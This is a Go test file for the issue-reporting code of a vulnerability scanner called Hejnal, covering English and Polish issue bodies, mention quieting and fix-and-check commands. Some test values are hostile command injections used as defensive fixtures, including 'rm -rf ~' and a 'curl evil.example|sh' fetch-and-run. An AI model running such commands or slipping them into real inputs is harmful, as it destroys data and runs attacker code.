package report

import (
	"strings"
	"testing"
	"time"

	"github.com/Legatia/hejnal/match"
)

func TestIssueFor(t *testing.T) {
	groups := match.Groups(findings())
	run := time.Date(2026, 11, 4, 6, 30, 0, 0, time.UTC)
	is := IssueFor(groups[0], IssueOptions{Lang: "en", Owner: "Network team", Run: run})
	if is.Item != groups[0].ID() || is.Title != "Fortinet FortiGate SSL VPN on vpn.example.com:443" {
		t.Errorf("issue = %q %q", is.Item, is.Title)
	}
	if !strings.HasPrefix(is.Body, "<!-- hejnal:item:"+is.Item+" -->\n- **Priority:** critical\n- **Owner:** Network team\n- **Rough effort:** about two hours\n") {
		t.Errorf("body starts:\n%s", is.Body)
	}
	for _, want := range []string{
		"- **Why:** Known exploited flaws in this product: 2.",
		"- **What to do:**",
		"**CVE-2025-61624**: Fortinet Multiple Products Path Traversal Vulnerability",
		"- **How sure:**",
		"\n---\nHejnal opened this issue from the run of 2026-11-04. It closes the issue when a later run no longer finds the item",
		"`hejnal accept -item " + is.Item + ` -reason "..."` + "`",
	} {
		if !strings.Contains(is.Body, want) {
			t.Errorf("body is missing %q\n%s", want, is.Body)
		}
	}
	if strings.Contains(is.Body, "###") {
		t.Errorf("body has the fix list's heading:\n%s", is.Body)
	}
	if got := IssueItem(is.Body); got != is.Item {
		t.Errorf("IssueItem = %q, want %q", got, is.Item)
	}

	pl := IssueFor(groups[1], IssueOptions{Lang: "pl", Run: run})
	for _, want := range []string{"- **Priorytet:** wysokie\n- **Szacowany nakład pracy:**", "Hejnal otworzył to zgłoszenie na podstawie sprawdzenia z 2026-11-04."} {
		if !strings.Contains(pl.Body, want) {
			t.Errorf("Polish body is missing %q\n%s", want, pl.Body)
		}
	}
	if strings.Contains(pl.Body, "Właściciel") {
		t.Errorf("body names an owner nobody set:\n%s", pl.Body)
	}
}

func TestIssueItem(t *testing.T) {
	cases := map[string]string{
		"<!-- hejnal:item:0a1b2c3d -->\ntext":        "0a1b2c3d",
		"\n  <!-- hejnal:item:0a1b2c3d -->":          "0a1b2c3d",
		"":                                           "",
		"Someone's own issue":                        "",
		"text\n<!-- hejnal:item:0a1b2c3d -->":        "",
		"<!-- hejnal:item:0a1b2c3d":                  "",
		"<!-- hejnal:item:0A1B2C3D -->":              "",
		"<!-- hejnal:item:0a1b2c3d4 -->":             "",
		"<!-- hejnal:item:../../etc -->":             "",
		"<!-- hejnal:item: --><!-- hejnal:item: -->": "",
	}
	for body, want := range cases {
		if got := IssueItem(body); got != want {
			t.Errorf("IssueItem(%q) = %q, want %q", body, got, want)
		}
	}
}

// Text from a scanned system must not notify anyone on GitHub, and the
// commands in an issue must stay as written.
func TestIssueQuietsMentions(t *testing.T) {
	fs := findings()[3:]
	fs[0].Technology = "Jenkins @acme/admins"
	fs[0].Evidence = "header X-Jenkins: @everyone"
	is := IssueFor(match.Groups(fs)[0], IssueOptions{Lang: "en", Owner: "@anna", Run: now})
	for _, text := range []string{is.Title, is.Body} {
		for _, bad := range []string{"@acme", "@anna"} {
			if strings.Contains(text, bad) {
				t.Errorf("%q can notify %s", text, bad)
			}
		}
	}
	if !strings.Contains(is.Title, "@\u2060acme/admins") || !strings.Contains(is.Body, "**Owner:** @\u2060anna") {
		t.Errorf("mentions were not kept readable:\n%s\n%s", is.Title, is.Body)
	}

	cases := map[string]string{
		"plain":                            "plain",
		"ask @ops":                         "ask @\u2060ops",
		"run `dig @8.8.8.8 a.pl` now @ops": "run `dig @8.8.8.8 a.pl` now @\u2060ops",
		"``a ` @b`` @c":                    "``a ` @b`` @\u2060c",
		"open ` @a":                        "open ` @\u2060a",
		"`` @a ` @b":                       "`` @\u2060a ` @\u2060b",
		"escaped \\` @a ` @b":              "escaped \\` @\u2060a ` @\u2060b",
		"\\@a":                             "\\@\u2060a",
		"`one`\n@two `three @x`":           "`one`\n@\u2060two `three @x`",
		"`open\n@next`":                    "`open\n@\u2060next`",
		"zażółć @gęś":                      "zażółć @\u2060gęś",
	}
	for in, want := range cases {
		if got := quietMentions(in); got != want {
			t.Errorf("quietMentions(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestIssueComments(t *testing.T) {
	run := time.Date(2026, 11, 9, 6, 0, 0, 0, time.UTC)
	if got, want := IssueGone("en", run, false), "The run of 2026-11-09 no longer finds this item, so Hejnal closed the issue."; got != want {
		t.Errorf("gone = %q", got)
	}
	if got := IssueGone("en", run, true); !strings.Contains(got, "saw a version outside the affected range") {
		t.Errorf("ruled out = %q", got)
	}
	if got := IssueGone("pl", run, false); !strings.Contains(got, "Sprawdzenie z 2026-11-09 nie znajduje już tego punktu") {
		t.Errorf("gone in Polish = %q", got)
	}
	if got := IssueFound("en", "0a1b2c3d", run, nil); !strings.Contains(got, "The run of 2026-11-09 finds this item, so Hejnal reopened the issue.") || !strings.Contains(got, "hejnal accept -item 0a1b2c3d") {
		t.Errorf("found = %q", got)
	}
	a := match.Acceptance{Item: "0a1b2c3d", Reason: "Behind the VPN, ask @ops <b>", By: "Anna Nowak", Until: "2026-11-08"}
	if got := IssueFound("en", "0a1b2c3d", run, &a); got != "The acceptance of this item ended on 2026-11-08 and the run of 2026-11-09 still finds it, so Hejnal reopened the issue." {
		t.Errorf("expired = %q", got)
	}
	got := IssueAccepted("en", a)
	want := "This item was accepted until 2026-11-08, so Hejnal closed the issue. Hejnal reopens it if the item is still there when the acceptance ends.\n\n- Reason: Behind the VPN, ask @\u2060ops &lt;b&gt;\n- Accepted by: Anna Nowak"
	if got != want {
		t.Errorf("accepted:\n%s\nwant:\n%s", got, want)
	}
	a.By = ""
	if got := IssueAccepted("pl", a); strings.Contains(got, "Kto zaakceptował") || !strings.Contains(got, "- Powód: ") {
		t.Errorf("accepted in Polish = %q", got)
	}
}

func TestIssueTitleIsOneShortLine(t *testing.T) {
	fs := findings()[3:]
	fs[0].Technology = "Jenkins\n" + strings.Repeat("x", 400)
	is := IssueFor(match.Groups(fs)[0], IssueOptions{Lang: "en", Run: now})
	if strings.ContainsAny(is.Title, "\r\n") || len([]rune(is.Title)) != maxIssueTitle || !strings.HasSuffix(is.Title, "…") {
		t.Errorf("title = %q (%d characters)", is.Title, len([]rune(is.Title)))
	}
}

// Each issue carries the facts and the command a person or a coding
// assistant needs to fix the item and tell that the fix worked.
func TestIssueFixAndCheck(t *testing.T) {
	block := func(g match.Group, lang string) string {
		t.Helper()
		body := IssueFor(g, IssueOptions{Lang: lang, Run: now}).Body
		_, rest, ok := strings.Cut(body, "\n\n**"+map[string]string{"en": "Fix and check", "pl": "Naprawa i sprawdzenie"}[lang]+"**\n\n")
		if !ok {
			return ""
		}
		rest, _, ok = strings.Cut(rest, "\n\n---\n")
		if !ok {
			t.Fatalf("the block does not end before the footer:\n%s", body)
		}
		return rest
	}
	dep := func(version, file, fixed string) match.Finding {
		return match.Finding{Kind: match.KindDependency, Host: "shop", Ecosystem: "npm", TechID: "npm:lodash", Technology: "lodash",
			Version: version, Advisory: "GHSA-35jh-r3h4-6jhm", CVE: "CVE-2021-23337", FixedIn: fixed, File: file, Score: 60,
			Severity: match.High, Confidence: match.ConfidenceVersion, Key: "dependency|shop|npm|lodash|" + version + "|GHSA-35jh-r3h4-6jhm|" + file}
	}

	g := match.Groups([]match.Finding{dep("4.17.20", "package-lock.json", "4.17.21"), dep("4.17.20", "admin/package-lock.json", "4.17.21")})[0]
	want := "- **Package:** `lodash` (npm)\n" +
		"- **Installed:** `4.17.20`\n" +
		"- **Fixed in:** `4.17.21`\n" +
		"- **Where:** `admin/package-lock.json`, `package-lock.json`\n" +
		"- **Check:** `hejnal code scan -project shop -item " + g.ID() + "`\n\n" +
		"Run the check in the directory the code scan ran in. It exits with status 2 while the item is found, 0 once it is not, and 1 when it cannot tell."
	if got := block(g, "en"); got != want {
		t.Errorf("dependency block:\n%s\nwant:\n%s", got, want)
	}
	if got := block(g, "pl"); !strings.Contains(got, "- **Pakiet:** `lodash` (npm)\n- **Zainstalowana wersja:** `4.17.20`\n- **Naprawione w wersji:** `4.17.21`\n- **Gdzie:** ") ||
		!strings.Contains(got, "- **Sprawdzenie:** `hejnal code scan -project shop -item "+g.ID()+"`\n\nUruchom sprawdzenie") {
		t.Errorf("Polish dependency block:\n%s", got)
	}

	// No fix yet: the line is left out, not guessed.
	if got := block(match.Groups([]match.Finding{dep("4.17.20", "package-lock.json", "")})[0], "en"); strings.Contains(got, "Fixed in") || !strings.Contains(got, "**Check:**") {
		t.Errorf("dependency without a fixed version:\n%s", got)
	}
	// A package found only in a container image: the check would need the
	// image, which the issue cannot name.
	if got := block(match.Groups([]match.Finding{dep("4.17.20", "shop.tar:app/package-lock.json", "4.17.21")})[0], "en"); strings.Contains(got, "hejnal code scan") || !strings.Contains(got, "**Where:** `shop.tar:app/package-lock.json`") {
		t.Errorf("dependency in an image:\n%s", got)
	}
	// A project's name that cannot go in a command gets none.
	odd := dep("4.17.20", "package-lock.json", "4.17.21")
	odd.Host = "shop; rm -rf ~"
	if got := block(match.Groups([]match.Finding{odd})[0], "en"); strings.Contains(got, "hejnal") || strings.Contains(got, "rm -rf") {
		t.Errorf("a project name with shell characters reached the block:\n%s", got)
	}

	mis := match.Groups([]match.Finding{{Kind: match.KindMisconfig, Host: "shop", TechID: "tf-sg-open-ssh", Technology: "aws_security_group.ssh",
		File: "infra/main.tf", Line: 2, Score: 60, Severity: match.High, Confidence: match.ConfidenceObserved, Key: "misconfig|shop|tf-sg-open-ssh|infra/main.tf|aws_security_group.ssh"}})[0]
	if got := block(mis, "en"); !strings.HasPrefix(got, "- **Where:** `infra/main.tf:2`\n- **Check:** `hejnal code scan -project shop -item "+mis.ID()+"`\n") {
		t.Errorf("infrastructure block:\n%s", got)
	}

	secret := match.Groups([]match.Finding{{Kind: match.KindSecret, Host: "shop", TechID: "github-pat", Technology: "GitHub personal access token",
		Evidence: "ghp_ab… (40 chars)", File: "app/settings.py", Line: 12, Fingerprint: "0123456789abcdef", Score: 90, Severity: match.Critical,
		Confidence: match.ConfidenceObserved, Key: "secret|0123456789abcdef|app/settings.py"}})[0]
	if got := block(secret, "en"); got != "- **Where:** `app/settings.py:12`" {
		t.Errorf("secret block:\n%q", got)
	}

	// A system: the address `hejnal live` takes, without the path.
	groups := match.Groups(findings())
	vpn := groups[0]
	got := block(vpn, "en")
	for _, want := range []string{
		"- **System:** `https://vpn.example.com`\n",
		"- **Product:** Fortinet FortiGate SSL VPN",
		"- **Check:** `hejnal live -item " + vpn.ID() + " https://vpn.example.com`\n\nThe check looks at this one system and saves nothing.",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("system block is missing %q:\n%s", want, got)
		}
	}
	// An address a scanned system chose cannot end the command.
	evil := findings()[3:4]
	evil[0].URL = "https://ci.example.com/a`;curl evil.example|sh;`?x=$(id)"
	if got := block(match.Groups(evil)[0], "en"); !strings.Contains(got, " https://ci.example.com`\n") || strings.Contains(got, "evil.example") || strings.Contains(got, "$(id)") {
		t.Errorf("a crafted address reached the block:\n%s", got)
	}

	// Mail records, breaches and names left pointing at a hosting service
	// are checked by the next run, not by a command here.
	for _, f := range []match.Finding{
		{Kind: match.KindEmail, Host: "example.com", TechID: "dmarc-missing", Score: 40, Severity: match.Medium, Key: "email|example.com|dmarc-missing"},
		{Kind: match.KindBreach, Host: "example.com", TechID: "Adobe", Name: "Adobe", Score: 60, Severity: match.Medium, Key: "breach|example.com|Adobe"},
		{Kind: match.KindTakeover, Host: "old.example.com", TechID: "github-pages", Technology: "GitHub Pages", URL: "https://old.example.com/", Score: 80, Severity: match.High, Key: "takeover|old.example.com|github-pages"},
	} {
		if got := block(match.Groups([]match.Finding{f})[0], "en"); got != "" {
			t.Errorf("%s item has a block:\n%s", f.Kind, got)
		}
	}
}
